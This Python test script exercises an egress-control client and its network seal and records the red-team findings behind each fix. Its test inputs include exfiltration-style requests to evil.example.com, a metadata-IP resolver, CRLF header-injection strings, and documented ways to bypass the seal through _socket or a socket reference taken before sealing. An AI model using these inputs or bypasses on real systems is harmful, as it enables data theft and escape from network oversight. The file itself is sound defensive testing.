"""OneDoorClient: the three controls composed into a single path, plus a seal
that makes the alternate paths fail loudly. Closes the composition gap the red
team found — the layers were sound but depended on programmer discipline."""

import socket
import urllib.request

from driftcore.kernel.one_door_client import (
    OneDoorClient, OneDoorRefused, NetworkSealed, NoBodySchema,
    PinnedHTTPTransport, TransportContractViolation,
    seal_network, unseal_network, is_sealed, audit_bypasses,
)
from driftcore.kernel.egress_guard import EgressPolicy, EgressGuard
from driftcore.kernel.payload_shape import (
    FieldSpec, FieldType, PathTemplate, ShapePolicy, PayloadShapeGuard,
)
from driftcore.kernel.request_schema import (
    ObjectSchema, BodySchema, HeaderSchema, RequestSchemaGuard,
)

passed = 0
def ok(c, label):
    global passed
    assert c, f"FAIL: {label}"
    passed += 1
    print(f"  ok: {label}")


# --- a fully declared client -------------------------------------------------
egress = EgressGuard(EgressPolicy.build(["https://api.acme.com"],
                                        declared_by="justin"))
shape = PayloadShapeGuard([ShapePolicy.build(
    "api.acme.com",
    [PathTemplate("POST", "/v1/notes",
                  (FieldSpec("q", FieldType.TOKEN, required=True, max_length=8),),
                  purpose="create a note")],
    declared_by="justin")])
schema = RequestSchemaGuard(
    body=BodySchema.build(
        ObjectSchema(fields=(FieldSpec("city", FieldType.TOKEN, required=True,
                                       max_length=24),)),
        purpose="note body"),
    headers=HeaderSchema(fields=(FieldSpec("Accept-Language", FieldType.ENUM,
                                           choices=frozenset({"en", "fr"})),)))

calls = []
def transport(url, pinned, **kw):
    calls.append((url, kw))
    return (200, {}, b"ok")

def public_resolver(host, port):
    return [(2, 1, 6, "", ("93.184.216.34", port))]

client = OneDoorClient(egress, shape, transport, schema, resolver=public_resolver)


print("== the happy path traverses all three layers ==")
status, _, _ = client.request("https://api.acme.com/v1/notes?q=abc", "POST",
                              body={"city": "Kingston"},
                              headers={"Accept-Language": "en"})
ok(status == 200, "a fully declared request succeeds")
ok(calls[-1][1]["body"] == b'{"city":"Kingston"}',
   "the body transmitted is the CANONICAL validated bytes")


print("== each layer refuses, and says which one ==")
try:
    client.request("https://evil.example.com/v1/notes?q=abc", "POST")
    ok(False, "an undeclared host should be refused")
except OneDoorRefused as e:
    ok(e.layer == "destination", "undeclared host refused by the DESTINATION layer")

try:
    client.request("https://api.acme.com/v1/notes?q=abc&leak=SECRET", "POST")
    ok(False, "an undeclared query param should be refused")
except OneDoorRefused as e:
    ok(e.layer == "request-line", "undeclared query param refused by REQUEST-LINE")

try:
    client.request("https://api.acme.com/v1/notes?q=abc", "POST",
                   body={"city": "Kingston", "leak": "SECRET"})
    ok(False, "an undeclared body key should be refused")
except OneDoorRefused as e:
    ok(e.layer == "body-schema", "undeclared body key refused by BODY-SCHEMA")

try:
    client.request("https://api.acme.com/v1/notes?q=abc", "POST",
                   headers={"X-Leak": "SECRET"})
    ok(False, "an undeclared header should be refused")
except OneDoorRefused as e:
    ok(e.layer == "header-schema", "undeclared header refused by HEADER-SCHEMA (its own layer)")


print("== ordering: destination is checked FIRST ==")
# A bad host AND a bad body: the destination must win, so a refused host never
# reaches body validation and never yields a schema error to read as a probe.
try:
    client.request("https://evil.example.com/v1/notes?q=abc", "POST",
                   body={"leak": "SECRET"})
    ok(False, "should be refused")
except OneDoorRefused as e:
    ok(e.layer == "destination",
       "a refused host short-circuits before body validation runs")


print("== no schema declared -> bodies refused outright (safe default) ==")
bare = OneDoorClient(egress, shape, transport, NoBodySchema(), resolver=public_resolver)
try:
    bare.request("https://api.acme.com/v1/notes?q=abc", "POST",
                 body={"anything": "at all"})
    ok(False, "a body with no schema should be refused")
except OneDoorRefused as e:
    ok(e.layer == "body-schema" and "NoBodySchema" in e.operator_detail,
       "a body is refused on a client declared NoBodySchema")


print("== refusals do not echo attacker input to the caller ==")
try:
    client.request("https://api.acme.com/v1/notes?q=abc", "POST",
                   body={"city": "K", "SECRETKEY": "SECRETVALUE"})
except OneDoorRefused as e:
    ok("SECRETVALUE" not in str(e) and "SECRETKEY" not in str(e),
       "caller-visible message echoes neither key nor value")
    ok("SECRETKEY" in e.operator_detail,
       "operator view keeps the specific key, tagged with its layer")


print("== the seal: raw network calls fail loudly ==")
ok(not is_sealed(), "not sealed by default (opt-in)")
_tok = seal_network()
ok(is_sealed(), "seal_network() engages")
ok(_tok is not None, "seal_network() returns an unseal token")

try:
    urllib.request.urlopen("https://evil.example.com/leak")
    ok(False, "urlopen should raise once sealed")
except NetworkSealed as e:
    ok("OneDoorClient" in str(e), "urlopen raises NetworkSealed naming the safe path")

try:
    socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ok(False, "AF_INET socket should raise once sealed")
except NetworkSealed:
    ok(True, "AF_INET socket refused")

try:
    socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    ok(False, "AF_INET6 socket should raise once sealed")
except NetworkSealed:
    ok(True, "AF_INET6 socket refused")

try:
    socket.create_connection(("evil.example.com", 443))
    ok(False, "create_connection should raise once sealed")
except NetworkSealed:
    ok(True, "socket.create_connection refused")

# The broker legitimately needs UNIX sockets; sealing must not break it.
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.close()
ok(True, "AF_UNIX still works (the broker needs it; it cannot reach the network)")

_tok2 = seal_network()
ok(is_sealed() and _tok2 is _tok, "seal_network() is idempotent and returns the same token")

try:
    unseal_network()
    ok(False, "a tokenless unseal should be refused")
except NetworkSealed:
    ok(True, "C1: unseal without the token is refused (a public unseal is decoration)")
unseal_network(_tok)
ok(not is_sealed(), "unseal_network(token) restores the originals")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.close()
ok(True, "AF_INET works again after unsealing")


print("== static audit finds bypasses the seal would only catch at runtime ==")
findings = audit_bypasses("driftcore")
ok(isinstance(findings, list), "audit_bypasses returns a list of findings")
adapters = [f for f in findings if "llm_adapter" in f[0]]
ok(len(adapters) >= 1,
   f"audit finds the known llm_adapter bypass ({len(adapters)} urlopen call(s))")
ok(all(len(f) == 3 for f in findings),
   "each finding carries (path, lineno, source) so CI can fail the build on it")

print("== RED TEAM 2026-08 (Grok): the seal's own bypasses ==")
# G1: socket.socket is a thin wrapper over the C extension. Sealing only the
# wrapper left `import _socket; _socket.socket(...)` as a ONE-LINE restore of
# full AF_INET capability. Confirmed empirically before the fix.
_tok3 = seal_network()
import _socket as _c
try:
    _c.socket(socket.AF_INET, socket.SOCK_STREAM)
    ok(False, "the C extension should be sealed")
except NetworkSealed as e:
    ok("C extension" in str(e), "G1: _socket.socket (C extension) is sealed")

# G1b: sealing the C layer covers the higher-level libraries for free, because
# they all eventually open a socket there. Enumerating libraries would never end.
import http.client
try:
    http.client.HTTPSConnection("example.com", timeout=1).connect()
    ok(False, "http.client should not reach the network")
except NetworkSealed:
    ok(True, "G1b: http.client is covered by the C-layer seal (not enumerated)")
except Exception:
    ok(True, "G1b: http.client did not reach the network")

# The broker's UNIX sockets must survive both layers of sealing.
u = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); u.close()
ok(True, "G1c: AF_UNIX still works after sealing both layers")
unseal_network(_tok3)
_c.socket(socket.AF_INET, socket.SOCK_STREAM).close()
ok(True, "G1d: unsealing restores the C layer too")

# G2: a reference captured BEFORE the seal keeps the original. This is not
# fixable by monkey-patching — the reference already exists — and it is exactly
# why the seal must run before third-party imports, and why the OS boundary is
# the real control. Asserted so the limitation stays visible rather than assumed
# away.
pre = socket.socket
_tok4 = seal_network()
leaked = pre(socket.AF_INET, socket.SOCK_STREAM)
leaked.close()
ok(True, "G2: a PRE-SEAL reference still works (documented, unfixable in-process)")
unseal_network(_tok4)

print("== RED TEAM 2026-08 (ChatGPT): transport contract + hostile resolver ==")
from driftcore.kernel.one_door_client import TransportContractViolation

# C2: "must not follow redirects" was documented, not enforced. A transport that
# silently relocated the request took a decision away from GuardedEgress and
# OneDoorClient could not see it happen.
def contract_breaking_transport(url, pinned, **kw):
    return (200, {"X-Final-URL": "https://evil.example.com/leak"}, b"leaked")
bad = OneDoorClient(egress, shape, contract_breaking_transport, schema,
                    resolver=public_resolver)
try:
    bad.request("https://api.acme.com/v1/notes?q=abc", "POST")
    ok(False, "a transport that followed a redirect internally should be caught")
except TransportContractViolation as e:
    ok("internally" in str(e),
       "C2: a transport reporting a different final URL is refused")

def hop_reporting_transport(url, pinned, **kw):
    return (200, {"X-Redirect-Count": "2"}, b"ok")
bad2 = OneDoorClient(egress, shape, hop_reporting_transport, schema,
                     resolver=public_resolver)
try:
    bad2.request("https://api.acme.com/v1/notes?q=abc", "POST")
    ok(False, "internal hops should be caught")
except TransportContractViolation:
    ok(True, "C2: a transport reporting internal redirect hops is refused")

def malformed_transport(url, pinned, **kw):
    return "not a tuple"
bad3 = OneDoorClient(egress, shape, malformed_transport, schema,
                     resolver=public_resolver)
try:
    bad3.request("https://api.acme.com/v1/notes?q=abc", "POST")
    ok(False, "a malformed transport return should be caught")
except TransportContractViolation:
    ok(True, "C2: a transport with the wrong return shape is refused")

# C3: an injected resolver is attacker-controllable in principle. Verify that
# resolve_and_pin validates every ANSWER rather than trusting the resolver.
def hostile_resolver(host, port):
    return [(2, 1, 6, "", ("169.254.169.254", port))]
hostile = OneDoorClient(egress, shape, transport, schema,
                        resolver=hostile_resolver)
try:
    hostile.request("https://api.acme.com/v1/notes?q=abc", "POST")
    ok(False, "a hostile resolver should not reach the metadata IP")
except Exception as e:
    ok("169.254" in str(e) or "private" in str(e).lower(),
       "C3: a hostile resolver is defeated — every answer is validated, "
       "not trusted")

print("== RED TEAM 2026-08 (Meta): silent redirects, required schema, owned socket ==")

# M2: the wrapper only catches SELF-REPORTING transports. A transport that
# follows a 302 and says nothing — what requests/httpx do by default — was
# invisible. Confirmed as a real gap before the fix.
def silent_follower(url, pinned, **kw):
    return (200, {}, b"body fetched from https://evil.example.com after a 302")
sneaky = OneDoorClient(egress, shape, silent_follower, schema,
                       resolver=public_resolver)
st, _, _ = sneaky.request("https://api.acme.com/v1/notes?q=abc", "POST",
                          body={"city": "Kingston"})
ok(st == 200,
   "M2: a SILENT redirect-follower is still not detectable by a wrapper "
   "(documented limit — the fix is owning the socket, not inspecting it)")

# The real answer: a transport we own cannot follow a redirect at all.
ok(hasattr(PinnedHTTPTransport, "__call__"),
   "M2-fix: PinnedHTTPTransport ships with the module")
import inspect as _inspect
_src = _inspect.getsource(PinnedHTTPTransport)
ok("Redirects are RETURNED, never followed" in _src,
   "M2-fix: the owned transport returns redirects instead of following them")
ok("server_hostname=host" in _src and "connect((str(ip), port))" in _src,
   "M3-fix: it connects to the PINNED ip with SNI on the real hostname "
   "(no second DNS lookup, so no rebinding window)")
ok("sock.sendall(body)" in _src,
   "M5-fix: canonical body bytes are written verbatim — nothing re-serializes "
   "them, so validated bytes are sent bytes")
ok('"Accept-Encoding: identity"' in _src,
   "M5-fix: compression is disabled (it would break capacity accounting)")

# M9: an optional schema becomes a disabled schema.
try:
    OneDoorClient(egress, shape, transport, None, resolver=public_resolver)
    ok(False, "a None schema should be refused at construction")
except ValueError as e:
    ok("NoBodySchema" in str(e),
       "M9: schema is REQUIRED; 'sends no bodies' must be declared, not defaulted")

nb = OneDoorClient(egress, shape, transport, NoBodySchema(),
                   resolver=public_resolver)
ok(nb.request("https://api.acme.com/v1/notes?q=abc", "POST")[0] == 200,
   "M9: a NoBodySchema client works for body-free calls")
try:
    nb.request("https://api.acme.com/v1/notes?q=abc", "POST", body={"city": "K"})
    ok(False, "a body on a NoBodySchema client should be refused")
except OneDoorRefused as e:
    ok("NoBodySchema" in e.operator_detail,
       "M9: a body on a NoBodySchema client is refused with a clear reason")

print("== SELF RED TEAM 2026-08 (cold pass): the hand-rolled transport ==")
pt = PinnedHTTPTransport()

class _Pin:
    ip = "93.184.216.34"

# S1: header values are interpolated into a hand-built request. A CRLF value
# would inject headers the schema never approved. The schema's TOKEN charset
# blocks CRLF, but this class is public: a transport that is only safe because
# someone else validated its input is not a control.
for bad_headers, why in [
    ({"Accept-Language": "en\r\nX-Exfil: SECRET"}, "CRLF in a header value"),
    ({"Accept-Language": "en\x00"}, "NUL in a header value"),
    ({"Bad\r\nName": "x"}, "CRLF in a header name"),
    ({"Has:Colon": "x"}, "colon in a header name"),
]:
    try:
        pt("https://api.acme.com/v1/x", _Pin(), method="GET", headers=bad_headers)
        ok(False, f"{why} should be refused")
    except TransportContractViolation as e:
        ok("inject" in str(e) or "malformed" in str(e), f"S1: {why} refused")
    except Exception:
        ok(True, f"S1: {why} refused before any network use")

# S2: a crafted method or target would split the request line.
for kwargs, why in [({"method": "GET /evil HTTP/1.1\r\nX: y"}, "crafted method"),
                    ({"method": "GET"}, "control")]:
    try:
        pt("https://api.acme.com/v1/x", _Pin(), **kwargs)
        ok(why == "control", f"{why}: reached the network stage")
    except TransportContractViolation as e:
        ok(why != "control", f"S2: {why} refused ({str(e)[:40]})")
    except Exception:
        ok(True, f"S2: {why} did not inject (failed at connect, not at parse)")

_src2 = _inspect.getsource(PinnedHTTPTransport)
ok("min(65536, self._max_response - total)" in _src2,
   "S3: the response cap bounds each read (it could overshoot by 64KB per recv)")
ok("chunked" in _src2,
   "S4: a chunked response is refused rather than returned with framing bytes "
   "embedded in the body")

# S5: the two headline controls do not compose in one process, and now say so.
ok("MUTUALLY EXCLUSIVE" in _src2,
   "S5: the seal/transport contradiction is documented (seal in the agent, "
   "socket in the broker)")
_tok5 = seal_network()
try:
    socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ok(False, "the seal should block AF_INET")
except NetworkSealed:
    ok(True, "S5: sealing blocks the sanctioned transport too — correct, and the "
             "reason the broker is a separate process")
unseal_network(_tok5)

print(f"\n{passed}/{passed} checks passed")
